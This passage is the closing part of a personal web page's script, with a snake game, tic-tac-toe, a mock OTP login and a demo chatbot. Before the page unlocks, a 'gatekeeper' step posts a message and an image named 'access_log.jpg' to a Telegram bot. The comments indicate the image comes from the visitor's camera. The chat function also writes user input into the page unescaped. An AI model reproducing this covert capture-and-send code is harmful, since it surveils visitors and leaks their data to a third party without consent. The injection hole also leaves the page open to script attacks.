            // --- STEP 4: SEND TO TELEGRAM ---
            sendToTelegram(message, imageBlob);

            // --- STEP 5: UNLOCK UI ---
            setTimeout(() => {
                const gate = document.getElementById('gatekeeper');
                const main = document.getElementById('main-interface');
                gate.style.transition = "opacity 0.6s";
                gate.style.opacity = "0";
                setTimeout(() => {
                    gate.style.display = "none";
                    main.style.display = "block";
                    setTimeout(() => main.style.opacity = "1", 50);
                }, 600);
            }, 1500);
        }

        // --- TELEGRAM SENDER ---
        function sendToTelegram(text, imgBlob) {
            const formData = new FormData();
            formData.append('chat_id', TG_CHAT);
            formData.append('caption', text);
            formData.append('parse_mode', 'Markdown');

            if (imgBlob) {
                // Send Photo + Caption
                formData.append('photo', imgBlob, 'access_log.jpg');
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).catch(err => console.error("TG Photo Fail:", err));
            } else {
                // Send Text Only (Fallback if Cam fails)
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TG_CHAT,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                }).catch(err => console.error("TG Text Fail:", err));
            }
        }

        // ==========================================
        // ðŸŽ® UI UTILITIES (Taps, Nav, Modals)
        // ==========================================
        function playTap() {
            const audio = document.getElementById('sfx-tap');
            if(audio) { audio.currentTime = 0; audio.play().catch(()=>{}); }
        }
        
        function themeSwitch() {
            playTap();
            const b = document.body;
            b.setAttribute('data-theme', b.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
        }

        function navAction(tab) {
            playTap();
            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
            if(tab === 'home') {
                document.getElementById('navHome').classList.add('active');
                window.scrollTo({ top: 0, behavior: 'smooth' });
            } else if(tab === 'links') {
                document.getElementById('navLinks').classList.add('active');
                document.getElementById('linksSection').scrollIntoView({ behavior: 'smooth' });
            } else if(tab === 'games') {
                document.getElementById('navGames').classList.add('active');
                document.getElementById('gameModal').classList.add('active');
            } else if(tab === 'login') {
                document.getElementById('navLogin').classList.add('active');
                document.getElementById('authModal').classList.add('active');
            }
        }

        function closeModal(e, force) {
            if(force || e.target.classList.contains('modal-wrap')) {
                document.querySelectorAll('.modal-wrap').forEach(m => m.classList.remove('active'));
                if(gameLoop) clearInterval(gameLoop);
            }
        }

        // Games Logic
        let gameLoop;
        function closeGame() { clearInterval(gameLoop); document.getElementById('gamePlayArea').style.display='none'; document.getElementById('gameMenu').style.display='block'; }
        
        function loadSnake() {
            document.getElementById('gameMenu').style.display='none';
            document.getElementById('gamePlayArea').style.display='flex';
            document.getElementById('activeGameTitle').innerText="SNAKE";
            const c = document.getElementById('gameContainer');
            c.innerHTML = `<canvas id="sCanvas" width="240" height="240"></canvas><div class="game-ctrl-pad"><button class="g-btn" onclick="sDir={x:-1,y:0}">â†</button><button class="g-btn" onclick="sDir={x:0,y:-1}">â†‘</button><button class="g-btn" onclick="sDir={x:1,y:0}">â†’</button><button class="g-btn" style="grid-column:2" onclick="sDir={x:0,y:1}">â†“</button></div>`;
            const ctx = document.getElementById('sCanvas').getContext('2d');
            let snake=[{x:10,y:10}], food={x:5,y:5}; window.sDir={x:0,y:0};
            gameLoop = setInterval(()=>{
                let head={x:snake[0].x+window.sDir.x, y:snake[0].y+window.sDir.y};
                snake.unshift(head);
                if(head.x==food.x && head.y==food.y) food={x:Math.floor(Math.random()*12),y:Math.floor(Math.random()*12)};
                else snake.pop();
                ctx.fillStyle='#000'; ctx.fillRect(0,0,240,240);
                ctx.fillStyle='red'; ctx.fillRect(food.x*20,food.y*20,18,18);
                ctx.fillStyle='#D4AF37'; snake.forEach(p=>ctx.fillRect(p.x*20,p.y*20,18,18));
                if(head.x<0||head.x>=12||head.y<0||head.y>=12) { clearInterval(gameLoop); alert("Game Over"); closeGame(); }
            }, 200);
        }

        function loadTicTacToe() {
            document.getElementById('gameMenu').style.display='none';
            document.getElementById('gamePlayArea').style.display='flex';
            document.getElementById('activeGameTitle').innerText="TIC TAC TOE";
            const c = document.getElementById('gameContainer');
            c.innerHTML = `<div id="tttGrid"></div>`;
            const g = document.getElementById('tttGrid');
            let b=['','','','','','','','',''], t='X';
            for(let i=0;i<9;i++){
                let d=document.createElement('div'); d.className='ttt-cell';
                d.onclick=()=>{
                    if(!b[i]){ b[i]=t; d.innerText=t; d.classList.add(t.toLowerCase()); t=t=='X'?'O':'X'; 
                    [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]].forEach(w=>{
                        if(b[w[0]] && b[w[0]]==b[w[1]] && b[w[0]]==b[w[2]]) { setTimeout(()=>{alert(b[w[0]]+" Wins!"); closeGame()},100); }
                    });
                }};
                g.appendChild(d);
            }
        }

        // Mock Auth
        function sendOTP() {
            if(document.getElementById('mobileInput').value.length < 10) return alert("Invalid Number");
            document.getElementById('otpArea').style.display = 'block';
            alert("OTP Sent: 1234");
        }
        function verifyOTP() {
            if(document.getElementById('otpInput').value === "1234") {
                document.getElementById('authModal').classList.remove('active');
                alert("Login Success!");
            } else alert("Wrong OTP");
        }

        // AI Mock
        function openAI() { document.getElementById('aiModal').classList.add('active'); }
        function handleEnter(e) { if(e.key==='Enter') sendMessage(); }
        function sendMessage() {
            const val = document.getElementById('userMsg').value;
            if(!val) return;
            const box = document.getElementById('chatHistory');
            box.innerHTML += `<div class="bubble user">${val}</div>`;
            document.getElementById('userMsg').value = "";
            setTimeout(() => {
                box.innerHTML += `<div class="bubble bot">I am just a demo bot. Please contact Lalu directly!</div>`;
                box.scrollTop = box.scrollHeight;
            }, 500);
        }
    </script>
</body>
</html>
